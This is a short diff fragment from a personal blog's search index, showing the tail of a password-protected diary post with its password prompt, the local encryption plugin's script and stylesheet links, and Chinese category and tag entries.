-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>Mad1sun的生活小日记</category>
-      </categories>
-      <tags>
-        <tag>Mad1sun倒霉蛋的日常</tag>
       </tags>
   </entry>
 </search>
